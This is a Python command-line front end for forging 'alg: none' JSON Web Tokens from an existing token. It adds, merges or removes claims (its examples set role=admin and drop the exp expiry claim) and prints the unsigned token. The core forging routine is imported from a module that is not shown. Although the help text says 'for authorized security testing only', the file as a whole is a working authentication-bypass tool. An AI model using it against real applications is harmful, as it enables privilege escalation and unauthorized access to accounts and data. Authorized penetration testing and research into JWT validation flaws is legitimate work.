#!/usr/bin/env python3
"""CLI for forging `alg: none` JWTs.

Usage examples:

    python cli.py <jwt> --set role=admin --remove exp
    echo "<jwt>" | python cli.py --merge-json '{"scope":"*"}'
    python cli.py <jwt> --decode-only
"""

from __future__ import annotations

import argparse
import json
import sys
from typing import NoReturn

from jwt_none import JWTError, decode_jwt, forge_none


def _die(msg: str, code: int = 2) -> NoReturn:
    print(f"error: {msg}", file=sys.stderr)
    raise SystemExit(code)


def _parse_set(value: str) -> tuple[str, str]:
    if "=" not in value:
        raise argparse.ArgumentTypeError(
            f"--set expects key=value, got: {value!r}"
        )
    key, _, raw = value.partition("=")
    if not key:
        raise argparse.ArgumentTypeError("--set key cannot be empty")
    return key, raw


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="jwt-none",
        description="Forge an alg:none JWT from an existing token. "
        "For authorized security testing only.",
    )
    p.add_argument(
        "token",
        nargs="?",
        help="JWT to transform; if omitted, read one line from stdin",
    )
    p.add_argument(
        "--set",
        dest="sets",
        action="append",
        default=[],
        type=_parse_set,
        metavar="KEY=VALUE",
        help="set a claim (value parsed as JSON when possible, else string). "
        "Dotted keys traverse nested objects: --set user.role=admin",
    )
    p.add_argument(
        "--merge-json",
        dest="merge_json",
        default=None,
        metavar="JSON",
        help="JSON object string deep-merged into payload",
    )
    p.add_argument(
        "--merge-json-file",
        dest="merge_json_file",
        default=None,
        metavar="PATH",
        help="path to a JSON object file deep-merged into payload",
    )
    p.add_argument(
        "--remove",
        dest="removes",
        action="append",
        default=[],
        metavar="KEY",
        help="remove a claim (dotted keys supported); repeatable",
    )
    p.add_argument(
        "--keep-header-extras",
        action="store_true",
        help="preserve non-alg header fields (kid, typ, cty, ...)",
    )
    p.add_argument(
        "--no-trailing-dot",
        action="store_true",
        help="omit the trailing '.' on the output (some libs accept either)",
    )
    p.add_argument(
        "--decode-only",
        action="store_true",
        help="just pretty-print the header and payload of the input token",
    )
    p.add_argument(
        "--json",
        dest="json_out",
        action="store_true",
        help="print full result as JSON ({header, payload, token})",
    )
    return p


def _load_token(arg_token: str | None) -> str:
    if arg_token:
        return arg_token.strip()
    if sys.stdin.isatty():
        _die("no token provided (pass as argument or via stdin)")
    data = sys.stdin.read().strip()
    if not data:
        _die("empty stdin")
    return data


def _load_merge_json(s: str | None, path: str | None) -> dict | None:
    if s and path:
        _die("--merge-json and --merge-json-file are mutually exclusive")
    text: str | None = None
    if s:
        text = s
    elif path:
        try:
            with open(path, "r", encoding="utf-8") as f:
                text = f.read()
        except OSError as e:
            _die(f"cannot read --merge-json-file: {e}")
    if text is None:
        return None
    try:
        obj = json.loads(text)
    except json.JSONDecodeError as e:
        _die(f"--merge-json is not valid JSON: {e}")
    if not isinstance(obj, dict):
        _die("--merge-json must be a JSON object")
    return obj


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    token = _load_token(args.token)

    try:
        if args.decode_only:
            header, payload, sig = decode_jwt(token)
            out = {"header": header, "payload": payload, "signature": sig}
            print(json.dumps(out, indent=2, ensure_ascii=False))
            return 0

        merge_json = _load_merge_json(args.merge_json, args.merge_json_file)

        new_header, new_payload, new_token = forge_none(
            token,
            sets=args.sets,
            merge_json=merge_json,
            removes=args.removes,
            keep_header_extras=args.keep_header_extras,
            trailing_dot=not args.no_trailing_dot,
        )
    except JWTError as e:
        _die(str(e))

    if args.json_out:
        print(
            json.dumps(
                {"header": new_header, "payload": new_payload, "token": new_token},
                indent=2,
                ensure_ascii=False,
            )
        )
    else:
        print(new_token)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
